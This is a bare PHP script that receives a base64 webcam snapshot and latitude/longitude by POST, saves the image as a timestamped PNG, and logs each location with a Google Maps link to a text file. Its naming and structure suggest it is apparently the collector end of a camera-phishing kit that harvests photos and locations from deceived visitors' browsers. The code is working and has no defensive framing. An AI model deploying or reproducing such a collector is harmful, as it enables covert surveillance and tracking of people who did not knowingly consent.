
<?php
header('Content-Type: application/json');

$date      = date('dMYHis');
$imageData = isset($_POST['cat']) ? $_POST['cat'] : '';
$latitude  = isset($_POST['lat']) ? $_POST['lat'] : '';
$longitude = isset($_POST['lng']) ? $_POST['lng'] : '';

if (empty($imageData)) {
    echo json_encode(['status' => 'error', 'message' => 'No image data received']);
    exit();
}

error_log("Received" . "\r\n", 3, "Log.log");

$commaPos = strpos($imageData, ',');
if ($commaPos === false) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid image data format']);
    exit();
}

$filteredData  = substr($imageData, $commaPos + 1);
$unencodedData = base64_decode($filteredData);

if ($unencodedData === false) {
    echo json_encode(['status' => 'error', 'message' => 'Base64 decode failed']);
    exit();
}

$fp = fopen('cam' . $date . '.png', 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

if (!empty($latitude) && !empty($longitude)) {
    $geoFile = 'geo.txt';
    $gf      = fopen($geoFile, 'a');
    fwrite($gf, "Time: "      . date('Y-m-d H:i:s T') . "\r\n");
    fwrite($gf, "Latitude: "  . $latitude              . "\r\n");
    fwrite($gf, "Longitude: " . $longitude             . "\r\n");
    fwrite($gf, "Map: https://maps.google.com/?q=" . $latitude . ',' . $longitude . "\r\n");
    fwrite($gf, str_repeat('-', 40) . "\r\n");
    fclose($gf);
}

echo json_encode(['status' => 'ok', 'file' => 'cam' . $date . '.png']);
exit();
?>

